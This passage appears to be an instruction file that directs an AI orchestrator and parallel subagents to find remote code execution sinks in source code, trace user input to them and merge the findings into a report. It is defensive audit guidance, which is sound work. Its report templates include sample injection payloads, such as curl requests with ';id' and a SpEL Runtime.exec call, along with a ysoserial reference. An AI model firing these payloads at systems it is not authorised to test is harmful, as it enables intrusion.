> - `Jint.Engine.Execute(var)` or similar JS-in-.NET evaluators — flag
>
> ---
>
> **Category 3 — Unsafe Deserialization Sinks**
>
> Look for deserialization of data that may originate externally. For deserialization sinks, flag every usage — the question of whether data is user-controlled is Phase 2's job:
>
> **Python:**
> - `pickle.loads(var)`, `pickle.load(file_var)` — flag always (pickle is inherently unsafe with untrusted data)
> - `marshal.loads(var)`, `marshal.load(file_var)` — flag always
> - `yaml.load(var)` without explicit `Loader=yaml.SafeLoader` — flag (any form without a safe loader)
> - `jsonpickle.decode(var)` — flag always
> - `shelve` accessed with externally-influenced keys
>
> **Java:**
> - `ObjectInputStream.readObject()`, `ObjectInputStream.readUnshared()` — flag always
> - `XMLDecoder.readObject()` — flag always
> - `XStream.fromXML(var)` — flag always (unless XStream security filters are explicitly configured)
> - `ObjectMapper` with `.enableDefaultTyping()` or `.activateDefaultTyping(...)` configured on it — flag the readValue call
> - `Kryo.readObject(var, ...)`, `Kryo.readClassAndObject(var)` — flag if input stream comes from external source
>
> **PHP:**
> - `unserialize(var)` — flag always when argument is a variable
>
> **Ruby:**
> - `Marshal.load(var)`, `Marshal.restore(var)` — flag always
> - `YAML.load(var)` (Psych) without `permitted_classes: []` — flag
>
> **Node.js:**
> - `require('node-serialize').unserialize(var)` — flag always
> - `yaml.load(var)` (js-yaml v3 default unsafe load) — flag
>
> **.NET:**
> - `BinaryFormatter.Deserialize(var)` — flag always
> - `SoapFormatter.Deserialize(var)` — flag always
> - `NetDataContractSerializer.ReadObject(var)` — flag
> - `JavaScriptSerializer.Deserialize(var)` — flag if TypeNameHandling is enabled or argument is variable
> - `LosFormatter.Deserialize(var)` — flag always
>
> **Go:**
> - `gob.NewDecoder(r).Decode(&v)` on externally influenced data — flag
>
> ---
>
> **Category 4 — Serverless / CI / Infrastructure Execution Sinks**
>
> Flag when user-controlled or externally-influenced values reach:
> - CI pipeline `run:` scripts or shell steps (GitHub Actions, GitLab CI, Azure Pipelines, CircleCI)
> - GitHub Actions expressions `${{ ... }}` evaluated against attacker-influenced contexts
> - cloud-init `runcmd` / `write_files` content built from user input
> - Lambda / function handler code that passes event fields to `eval`, `exec`, `os.system`, or deserialization
> - Terraform / Helm / Kustomize template values rendered into shell snippets or command args
>
> ---
>
> **What to skip** (these are safe and should not be flagged):
> - `subprocess.run(["cmd", arg1, arg2])` with a list and no `shell=True` — no shell expansion
> - `json.loads(var)`, `JSON.parse(var)`, `json_decode(var)` — safe format with no code execution
> - `yaml.safe_load(var)` or `yaml.load(var, Loader=yaml.SafeLoader)` — safe loader
> - `ast.literal_eval(var)` — only parses Python literals, not arbitrary code
> - `SimpleEvaluationContext` SpEL evaluations with read-only data binding
> - `JsonConvert.DeserializeObject<T>(json)` in .NET with default `TypeNameHandling.None`
>
> ---
>
> **Output format** — write to `{{ REPORTS_ROOT }}/05_recon.md`:
>
> ```markdown
> # RCE Recon: [Project Name]
>
> ## Summary
> Found [N] potential RCE sinks: [X] OS command, [Y] code injection, [Z] unsafe deserialization.
>
> ## Sinks Found
>
> ### 1. [Descriptive name — e.g., "shell=True subprocess in image converter"]
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Function / endpoint**: [function name or route]
> - **Category**: [OS Command Injection / Code Injection / Expression Language Injection / Unsafe Deserialization / Processor RCE / CI Environment Injection]
> - **Sink**: [the dangerous function call — e.g., subprocess.run(..., shell=True)]
> - **Dynamic argument(s)**: `var_name` — [brief note on what it appears to represent]
> - **Code snippet**:
>   ```
>   [the relevant code around the sink]
>   ```
>
> [Repeat for each sink]
> ```

### After Phase 1: Check for Candidates Before Proceeding

After Phase 1 completes, read `{{ REPORTS_ROOT }}/05_recon.md`. If the recon found **zero sinks** (the summary reports "Found 0" or the "Sinks Found" section is empty or absent), **skip Phase 2 and Phase 3 entirely**. Instead, write the following content to `{{ REPORTS_ROOT }}/05_rce.md`, **delete** `{{ REPORTS_ROOT }}/05_recon.md`, and stop:

```markdown
# RCE Analysis Results

No vulnerabilities found.
```

Only proceed to Phase 2 if Phase 1 found at least one potential sink.

### Phase 2: Trace User Input to Sinks (Batched)

After Phase 1 completes, read `{{ REPORTS_ROOT }}/05_recon.md` and split the sinks into **batches of up to 3 sinks each** (numbered sections under `## Sinks Found`: `### 1.`, `### 2.`, etc.). Launch **one subagent per batch in parallel**. Each subagent traces taint only for its assigned sinks and writes results to its own batch file.

**Batching procedure** (you, the orchestrator, do this — not a subagent):

1. Read `{{ REPORTS_ROOT }}/05_recon.md` and count the numbered sink sections (`### 1.`, `### 2.`, ...).
2. Divide them into batches of up to 3. For example, 8 sinks → 3 batches (1-3, 4-6, 7-8).
3. For each batch, extract the full text of those sink sections from the recon file.
4. Launch all batch subagents **in parallel**, passing each one only its assigned sinks.
5. Each subagent writes to `{{ REPORTS_ROOT }}/05_batch_N.md` where N is the 1-based batch number.
6. Identify the project's primary language/framework from `{{ REPORTS_ROOT }}/01_architecture.md` and select **only the matching examples** from the "Vulnerable vs. Secure Examples" section above. For example, if the project is Python-focused, include the Python OS command, eval, pickle, and YAML subsections that apply. Include these selected examples in each subagent's instructions where indicated by `[TECH-STACK EXAMPLES]` below.

Give each batch subagent the following instructions (substitute the batch-specific values):

> **Goal**: For each assigned RCE sink, determine whether a user-supplied value reaches the dangerous argument. Our goal is to find code execution vulnerabilities. Write results to `{{ REPORTS_ROOT }}/05_batch_[N].md`.
>
> **Your assigned sinks** (from the recon phase):
>
> [Paste the full text of the assigned sink sections here, preserving the original numbering]
>
> **Context**: You will be given the project's architecture summary. Use the architecture to understand request entry points, middleware, and how data flows through the application.
>
> **RCE reference — what to look for**:
>
> Trace each sink's dynamic argument(s) back to their origin. RCE requires attacker-controlled data to reach a dangerous sink (OS command with shell interpretation, eval-like execution, expression-language evaluation, processor command construction, CI/infrastructure execution, or unsafe deserialization).
>
> **What RCE is NOT** — do not flag these as RCE:
> - **SSRF**, **path traversal**, **SSTI**, **XSS**, **SQLi** — other classes (see skill preamble).
> - **Safe subprocess list-form** with no shell: arguments passed without shell expansion are not command injection.
> - **Safe formats**: `json.loads`, `yaml.safe_load`, `ast.literal_eval` — no code execution semantics.
> - **Pure SSTI** belongs to `06-ssti.md`; only flag template-engine arbitrary code execution here, and cross-reference `06_ssti.md`.
>
> **Specialized vectors to consider during tracing**:
> - Shell metacharacter chaining (`;`, `&&`, `||`, `|`, `$()`, backticks, newline injection).
> - Polyglot payloads that bypass validation before reaching execution sinks.
> - Processor-related RCE (ImageMagick, FFmpeg, LaTeX, PDF generators, Office converters).
> - Serverless / CI environment injection (build scripts, Lambda layers, GitHub Actions expressions, cloud-init).
>
> **Mitigations that prevent exploitation** — if present and effective, the sink is likely safe:
> 1. **Subprocess list form without shell**: `subprocess.run(["cmd", var])` without `shell=True` — no shell metacharacter injection.
> 2. **Strict allowlist** before use: fixed set of safe values only.
> 3. **Safe deserialization**: JSON, `yaml.safe_load`, concrete typed Jackson reads without default typing, .NET JSON without TypeNameHandling.
> 4. **Safe expression context**: SpEL `SimpleEvaluationContext` or equivalent with no access to `Runtime`, `ProcessBuilder`, or reflection.
> 5. **Processor hardening**: dangerous features disabled, sandboxed execution, up-to-date binaries.
>
> **Vulnerable vs. secure examples for this project's tech stack**:
>
> [TECH-STACK EXAMPLES]
>
> **For each sink, trace the dynamic argument(s) backwards to their origin**:
>
> 1. **Direct user input** — the variable is assigned directly from a request source with no transformation:
>    - HTTP query params: `request.GET.get(...)`, `req.query.x`, `params[:x]`, `$_GET['x']`, `c.Query("x")`
>    - Path parameters: `request.path_params['id']`, `req.params.id`, `params[:id]`
>    - Request body / form fields: `request.POST.get(...)`, `req.body.x`, `params[:x]`, `$_POST['x']`
>    - HTTP headers: `request.headers.get(...)`, `req.headers['x']`
>    - Cookies: `request.COOKIES.get(...)`, `req.cookies.x`
>    - File upload content: `request.files['file'].read()`, `req.file.buffer`
>    - WebSocket messages, queue/event payloads
>    - Third-party API responses consumed by the target API
>
> 2. **Indirect user input** — the variable is derived from user input through transformations, function calls, or intermediate assignments. Trace the full chain:
>    - Variable assigned from a function return value → check that function's parameter origin
>    - Variable passed as a function argument → check the call site(s)
>    - Variable conditionally assigned — check all branches
>
> 3. **Externally-influenced deserialization data** — for deserialization sinks: Is the raw bytes/string coming from a network socket, HTTP request body, cookie, file upload, or a database value that was originally user-supplied? Any externally-controllable byte stream fed to an unsafe deserializer is exploitable.
>
> 4. **Server-side / hardcoded value** — the variable comes from config, an environment variable, a hardcoded constant, or server-side logic with no external influence — NOT exploitable.
>
> **Mitigations to check for each sink**:
> - **Allowlist validation**: Is the variable validated against a fixed set of known-safe values before use? If strict and complete, mark as Not Vulnerable.
> - **Integer/type cast**: Does casting to `int`/`float` actually prevent injection in this context? Effective only for purely numeric arguments with no quoting issues.
> - **escapeshellarg / escapeshellcmd** (PHP): Reduces risk but is not elimination — flag as Likely Vulnerable; shell escaping has bypass history in certain contexts.
> - **Subprocess list form**: `subprocess.run(["cmd", var])` without `shell=True` — arguments are passed directly to the OS, no shell expansion. This IS an effective mitigation for command injection (mark as Not Vulnerable for injection; the value is still passed to the command, but cannot inject new commands).
> - **Safe deserializer in place**: If `json.loads()`, `yaml.safe_load()`, etc. are used instead — skip (Phase 1 should not have flagged these).
> - **Safe expression context**: If SpEL `SimpleEvaluationContext`, JEXL restricted permissions, or equivalent sandboxing is in place and verified effective — mark as Not Vulnerable.
>
> **Classification**:
> - **Vulnerable**: User input demonstrably reaches the dangerous sink with no effective mitigation.
> - **Likely Vulnerable**: User input probably reaches the sink (indirect flow) or only weak mitigation is present (shell escaping, partial validation, unclear allowlist).
> - **Not Vulnerable**: The argument is server-side only, OR effective mitigation is in place (subprocess list form, strict allowlist, safe deserializer format, safe expression context).
> - **Needs Manual Review**: Cannot determine the argument's origin with confidence (passes through opaque helpers, complex conditional flows, or external libraries).
>
> **Output format** — write to `{{ REPORTS_ROOT }}/05_batch_[N].md`:
>
> ```markdown
> # RCE Batch [N] Results
>
> ## Findings
>
> ### [VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Category**: [OS Command Injection / Code Injection / Expression Language Injection / Unsafe Deserialization / Processor RCE / CI Environment Injection]
> - **CWE**: [CWE-78 / CWE-94 / CWE-95 / CWE-502 / most specific applicable]
> - **Issue**: [e.g., "HTTP query param `host` flows directly into shell=True subprocess call"]
> - **Taint trace**: [Step-by-step from entry point to the sink — e.g., "request.args.get('host') → host → subprocess.run(f'ping -c 1 {host}', shell=True)"]
> - **Impact**: [What an attacker can do — execute arbitrary OS commands, read /etc/passwd, establish reverse shell, achieve full server compromise, etc.]
> - **Remediation**: [Specific fix — use list-form subprocess, replace eval with safe alternative, switch to json.loads/yaml.safe_load, use SimpleEvaluationContext, disable processor feature, etc.]
> - **Dynamic Test**:
>   ```
>   [curl command or payload to confirm the finding.
>    Show the exact parameter, payload, and what to look for in the response.
>    Examples:
>      curl "https://app.example.com/ping?host=127.0.0.1;id"
>      curl "https://app.example.com/ping?host=127.0.0.1%3Bid"
>      For expression language: ?expr=${T(java.lang.Runtime).getRuntime().exec('id')}
>      For processor RCE: crafted MVG/LaTeX/Office file upload
>      For deserialization: show how to craft a malicious payload with ysoserial or pickletools]
>   ```
>
> ### [LIKELY VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Category**: [OS Command Injection / Code Injection / Expression Language Injection / Unsafe Deserialization / Processor RCE / CI Environment Injection]
> - **CWE**: [applicable CWE]
> - **Issue**: [e.g., "Variable likely sourced from user input via helper function" or "escapeshellarg applied but bypassable in some contexts"]
> - **Taint trace**: [Best-effort trace with the uncertain step identified]
> - **Concern**: [Why it's still a risk despite uncertainty]
> - **Remediation**: [Fix]
> - **Dynamic Test**:
>   ```
>   [payload to attempt]
>   ```
>
> ### [NOT VULNERABLE] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Reason**: [e.g., "Argument is hardcoded constant" or "subprocess called with list form, no shell=True — shell injection impossible" or "strict allowlist gates the value before use"]
>
> ### [NEEDS MANUAL REVIEW] Descriptive name
> - **File**: `path/to/file.ext` (lines X-Y)
> - **Endpoint / function**: [route or function name]
> - **Uncertainty**: [Why the variable's origin could not be determined]
> - **Suggestion**: [What to trace manually — e.g., "Follow `build_command()` in utils.py to check where its return value originates"]
> ```

### Phase 3: Merge — Consolidate Batch Results

After **all** Phase 2 batch subagents complete, read every `{{ REPORTS_ROOT }}/05_batch_*.md` file and merge them into a single `{{ REPORTS_ROOT }}/05_rce.md`. You (the orchestrator) do this directly — no subagent needed.

**Merge procedure**:

1. Read all `{{ REPORTS_ROOT }}/05_batch_1.md`, `{{ REPORTS_ROOT }}/05_batch_2.md`, ... files.
2. Collect all findings from each batch file and combine them into one list, preserving the original classification and all detail fields.
3. Count totals across all batches for the executive summary.
4. Write the merged report to `{{ REPORTS_ROOT }}/05_rce.md` using this format:

```markdown
# RCE Analysis Results: [Project Name]

## Executive Summary
- Sinks analyzed: [total across all batches]
- Vulnerable: [N]
- Likely Vulnerable: [N]
- Not Vulnerable: [N]
- Needs Manual Review: [N]

## Findings

[All findings from all batches, grouped by classification:
 VULNERABLE first, then LIKELY VULNERABLE, then NEEDS MANUAL REVIEW, then NOT VULNERABLE.
 Preserve every field from the batch results exactly as written.]
```

5. After writing `{{ REPORTS_ROOT }}/05_rce.md`, **delete all intermediate batch files** (`{{ REPORTS_ROOT }}/05_batch_*.md`) and **delete** `{{ REPORTS_ROOT }}/05_recon.md`.

---

## OWASP API Security Top 10 2023 mapping

This scan supports the following OWASP API Security Top 10 2023 risks:

- **API8:2023 Security Misconfiguration** — Dangerous OS command, eval-like, expression-language, and deserialization functions are enabled or used with insecure default configurations. Insecure defaults in processors/deserializers, verbose errors, and unnecessary features increase exploitability.
- **API10:2023 Unsafe Consumption of APIs** — User-controlled or third-party data is passed to command shells, eval-like engines, expression-language evaluators, processor command lines, CI expressions, or unsafe deserializers without validation or sanitization.

---

## Important Reminders

- Read `{{ REPORTS_ROOT }}/01_architecture.md` and pass its content to all subagents as context.
- Phase 2 must run AFTER Phase 1 completes — it depends on the recon output.
- Phase 3 must run AFTER all Phase 2 batches complete — it depends on all batch outputs.
- Batch size is **3 sinks per subagent**. If there are 1-3 sinks total, use a single subagent. If there are 10, use 4 subagents (3+3+3+1).
- Launch all batch subagents **in parallel** — do not run them sequentially.
- Each batch subagent receives only its assigned sinks' text from the recon file, not the entire recon file. This keeps each subagent's context small and focused.
- **Phase 1 is purely structural**: flag any sink where a non-constant variable appears in a dangerous position, regardless of where that variable comes from. Do not trace user input in Phase 1.
- **Phase 2 is purely taint analysis**: for each sink found in Phase 1, trace the dynamic argument back to its origin. If it comes from a user-controlled source, the site is a real vulnerability.
- **For deserialization sinks**: any externally-controllable byte stream is dangerous — HTTP bodies, cookies, file uploads, WebSocket frames, queue messages, third-party API responses. Be conservative and flag all deserialization sinks where data flow from an external source cannot be ruled out.
- **For OS command sinks**: `subprocess.run(["cmd", var])` with list form and no `shell=True` is NOT command injection — the argument is passed directly to the process without shell interpretation. Only flag when shell interpretation is possible (string command + `shell=True`, or `exec()`/`system()` equivalents).
- **For `eval`-like sinks**: there is almost no safe way to use `eval()` with user input. Any eval-like sink receiving external data should be flagged Vulnerable.
- **For expression-language sinks**: `StandardEvaluationContext`, unrestricted JEXL/OGNL, or user-controlled Thymeleaf/SpEL fragments are RCE. `SimpleEvaluationContext` with read-only data binding is a valid mitigation.
- **For processor-related sinks**: a user-controlled filename or file content reaching ImageMagick, FFmpeg, LaTeX, PDF generators, or Office converters is RCE if dangerous features are not disabled and the process is not sandboxed.
- **For CI/serverless sinks**: treat CI variables, GitHub Actions expressions, Lambda event fields, and cloud-init user data as potential user input when they reach execution or deserialization primitives.
- When in doubt, classify as "Needs Manual Review" rather than "Not Vulnerable". False negatives are worse than false positives in security assessment.
- Taint can flow indirectly through middleware, helper functions, class attributes, and intermediate variables. Trace the full chain.
- Second-order RCE is possible: a value stored from user input may later be deserialized or evaluated in a different code path (e.g., a user-supplied config stored in DB and later `eval()`'d by a cron job).
- For Java deserialization: the presence of dangerous gadget libraries in the classpath (Apache Commons Collections, Spring Framework, etc.) determines exploitability. Flag the deserialization call; note any relevant libraries from `architecture.md`.
- Clean up intermediate files: delete `{{ REPORTS_ROOT }}/05_recon.md` and all `{{ REPORTS_ROOT }}/05_batch_*.md` files after the final `{{ REPORTS_ROOT }}/05_rce.md` is written (Phase 3 merge step 5 performs this).
- **Do not modify project source code**. Subagents must only produce reports under `{{ REPORTS_ROOT }}/`.
